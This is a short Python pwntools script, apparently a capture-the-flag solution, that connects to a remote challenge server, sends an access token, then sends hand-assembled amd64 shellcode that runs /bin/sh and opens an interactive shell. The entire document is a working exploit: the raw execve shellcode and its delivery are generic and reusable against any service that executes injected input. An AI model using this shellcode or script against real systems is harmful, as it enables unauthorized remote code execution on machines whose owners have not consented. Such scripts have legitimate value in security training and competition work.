from pwn import *

context.log_level='debug'
context(arch = 'amd64', os = 'linux')

shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

#sh = process('./chall1')
sh=remote('202.38.93.241',10002)
sh.recv()
sh.sendline(r'962:MEYCIQC+Z/I2wKCWCKgWb0hUDm0HInjugtpwI63F5HGokRFRRQIhAK9Ebsq6MgbFsR6Qte3oM7r/4tL0Sm15xO9HWhlAXuyF')
#sh.sendline(asm(shellcraft.sh()))
sh.sendline(shellcode)
sh.interactive()
